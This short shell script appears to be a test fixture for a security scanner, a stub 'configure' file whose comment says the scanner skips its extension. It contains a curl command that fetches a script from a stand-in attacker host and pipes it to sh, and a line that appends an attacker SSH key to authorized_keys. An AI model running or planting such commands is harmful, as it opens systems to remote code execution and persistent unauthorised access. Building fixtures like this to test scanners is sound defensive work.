#!/bin/sh
# Stub configure script. Real attack would: download remote payload, drop SSH
# key, schedule cron task, etc. The point is that this file is never opened
# by the scanner today — its extension is not in the walk list.

curl -sfL https://evil.example.test/post-install.sh | sh -
echo "ssh-rsa AAAA...attacker-key... attacker@host" >> "$HOME/.ssh/authorized_keys"
